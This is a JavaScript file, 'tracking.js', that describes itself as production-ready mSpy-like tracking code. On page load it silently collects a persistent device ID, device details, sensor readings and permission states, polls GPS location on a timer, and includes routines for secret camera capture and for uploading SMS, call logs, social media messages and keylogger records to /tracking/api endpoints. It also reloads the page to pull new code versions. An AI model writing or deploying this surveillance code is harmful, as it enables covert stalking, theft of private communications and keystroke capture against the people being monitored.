/**
 * tracking.js – Production Ready with Auto‑Update
 *
 * Features:
 * - Auto‑generated device ID stored in localStorage.
 * - Configurable update interval (default 60 seconds).
 * - Sends location, device info, sensor data, permission statuses.
 * - Optionally captures a photo.
 * - Sends mSpy‑like data (SMS, call logs, social media messages, keylogger logs) via dedicated endpoints.
 * - Auto‑update mechanism: periodically checks the /tracking/api/js_version/ endpoint
 *   and reloads the page if a new version is available.
 * - All functions include error handling to ensure robust, failsafe operation.
 */

function getOrCreateDeviceId() {
    let deviceId = localStorage.getItem('deviceId');
    if (!deviceId) {
      deviceId = 'dev-' + ([1e7]+-1e3+-4e3+-8e3+-1e11)
        .replace(/[018]/g, c =>
          (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
        );
      localStorage.setItem('deviceId', deviceId);
    }
    return deviceId;
  }
  
  const deviceId = getOrCreateDeviceId();
  let updateInterval = parseInt(localStorage.getItem('updateInterval')) || 60 * 1000;
  
  // Send location data.
  function sendLocationData() {
    try {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const data = {
            device_id: deviceId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          fetch('/tracking/api/location/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(json => console.log('Location update:', json))
          .catch(err => console.error('Error updating location:', err));
        }, error => console.error('Geolocation error:', error));
      } else {
        console.error("Geolocation is not supported by this browser.");
      }
    } catch (e) {
      console.error("sendLocationData error:", e);
    }
  }
  
  // Send device info.
  function sendDeviceInfo() {
    try {
      const data = {
        device_id: deviceId,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        screen_width: screen.width,
        screen_height: screen.height,
        other_details: {
          language: navigator.language,
          cookieEnabled: navigator.cookieEnabled,
          deviceMemory: navigator.deviceMemory || null,
          hardwareConcurrency: navigator.hardwareConcurrency || null
        }
      };
      fetch('/tracking/api/device/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(json => console.log('Device info update:', json))
      .catch(err => console.error('Error updating device info:', err));
    } catch (e) {
      console.error("sendDeviceInfo error:", e);
    }
  }
  
  // Send sensor data.
  function sendSensorData() {
    try {
      let sensorData = {};
      if (window.DeviceMotionEvent) {
        const motionHandler = (event) => {
          sensorData.acceleration = event.acceleration;
          sensorData.accelerationIncludingGravity = event.accelerationIncludingGravity;
          sensorData.rotationRate = event.rotationRate;
          sensorData.interval = event.interval;
          window.removeEventListener('devicemotion', motionHandler);
          fetch('/tracking/api/sensor/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: deviceId, sensor_data: sensorData })
          })
          .then(response => response.json())
          .then(json => console.log('Sensor data update:', json))
          .catch(err => console.error('Error updating sensor data:', err));
        };
        window.addEventListener('devicemotion', motionHandler);
      } else {
        console.warn("DeviceMotionEvent is not supported by this browser.");
      }
    } catch (e) {
      console.error("sendSensorData error:", e);
    }
  }
  
  // Send permission status.
  function sendPermissionStatus() {
    try {
      const statusData = { device_id: deviceId };
      const permissions = ['geolocation', 'camera', 'microphone', 'notifications'];
      let promises = permissions.map(perm => 
        navigator.permissions.query({ name: perm })
          .then(result => { statusData[perm] = (result.state === 'granted'); })
          .catch(() => { statusData[perm] = false; })
      );
      statusData.clipboard = false;
      statusData.sensors = ('DeviceMotionEvent' in window);
      statusData.bluetooth = ('bluetooth' in navigator);
      Promise.all(promises).then(() => {
        fetch('/tracking/api/permission/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(statusData)
        })
        .then(response => response.json())
        .then(json => console.log('Permission status update:', json))
        .catch(err => console.error('Error updating permission status:', err));
      });
    } catch (e) {
      console.error("sendPermissionStatus error:", e);
    }
  }
  
  // Optionally capture a photo.
  function capturePhoto() {
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.addEventListener('loadeddata', () => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const context = canvas.getContext('2d');
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('device_id', deviceId);
                formData.append('image', blob, 'capture.jpg');
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(position => {
                    formData.append('latitude', position.coords.latitude);
                    formData.append('longitude', position.coords.longitude);
                    fetch('/tracking/api/photo/', {
                      method: 'POST',
                      body: formData
                    })
                    .then(response => response.json())
                    .then(json => console.log('Photo capture update:', json))
                    .catch(err => console.error('Error capturing photo:', err));
                  }, error => {
                    console.error('Geolocation error for photo capture:', error);
                    fetch('/tracking/api/photo/', {
                      method: 'POST',
                      body: formData
                    })
                    .then(response => response.json())
                    .then(json => console.log('Photo capture update:', json))
                    .catch(err => console.error('Error capturing photo:', err));
                  });
                } else {
                  fetch('/tracking/api/photo/', {
                    method: 'POST',
                    body: formData
                  })
                  .then(response => response.json())
                  .then(json => console.log('Photo capture update:', json))
                  .catch(err => console.error('Error capturing photo:', err));
                }
                stream.getTracks().forEach(track => track.stop());
              }, 'image/jpeg');
            });
          })
          .catch(err => console.error('Error accessing camera for photo capture:', err));
      } else {
        console.error("Camera access is not supported by this browser.");
      }
    } catch (e) {
      console.error("capturePhoto error:", e);
    }
  }
  
  // Additional mSpy-like functions: SMS, call logs, social media, keylogger.
  function sendSMSLog(message, sender, receiver, direction) {
    try {
      const data = { device_id: deviceId, message, sender, receiver, direction };
      fetch('/tracking/api/sms/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(json => console.log('SMS log update:', json))
      .catch(err => console.error('Error updating SMS log:', err));
    } catch (e) {
      console.error("sendSMSLog error:", e);
    }
  }
  
  function sendCallLog(caller, callee, duration) {
    try {
      const data = { device_id: deviceId, caller, callee, duration };
      fetch('/tracking/api/call/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(json => console.log('Call log update:', json))
      .catch(err => console.error('Error updating call log:', err));
    } catch (e) {
      console.error("sendCallLog error:", e);
    }
  }
  
  function sendSocialMediaLog(platform, sender, message) {
    try {
      const data = { device_id: deviceId, platform, sender, message };
      fetch('/tracking/api/social/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(json => console.log('Social media log update:', json))
      .catch(err => console.error('Error updating social media log:', err));
    } catch (e) {
      console.error("sendSocialMediaLog error:", e);
    }
  }
  
  function sendKeyloggerLog(keystrokes) {
    try {
      const data = { device_id: deviceId, keystrokes };
      fetch('/tracking/api/keylogger/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(json => console.log('Keylogger log update:', json))
      .catch(err => console.error('Error updating keylogger log:', err));
    } catch (e) {
      console.error("sendKeyloggerLog error:", e);
    }
  }
  
  // Initialize device info once.
  function initDeviceInfo() {
    sendDeviceInfo();
  }
  
  // Initialize all tracking features.
  function initTracking() {
    initDeviceInfo();
    sendPermissionStatus();
    sendLocationData();
    setInterval(() => {
      sendLocationData();
      sendPermissionStatus();
      sendSensorData();
      // Optionally, call capturePhoto() for periodic photo capture.
    }, updateInterval);
  }
  
  // Auto-update mechanism: periodically check for new JS version.
  const TRACKING_JS_VERSION = "1.0.0";
  const AUTO_UPDATE_INTERVAL = 5 * 60 * 1000;  // every 5 minutes
  
  function checkForJsUpdate() {
    try {
      fetch('/tracking/api/js_version/')
        .then(response => response.json())
        .then(data => {
          const serverVersion = data.version;
          if (serverVersion !== TRACKING_JS_VERSION) {
            console.log("New JS version available:", serverVersion);
            window.location.reload(true);
          } else {
            console.log("JS version up-to-date:", TRACKING_JS_VERSION);
          }
        })
        .catch(err => console.error("Failed to check for JS update:", err));
    } catch (e) {
      console.error("checkForJsUpdate error:", e);
    }
  }
  
  setInterval(checkForJsUpdate, AUTO_UPDATE_INTERVAL);
  
  document.addEventListener('DOMContentLoaded', initTracking);
  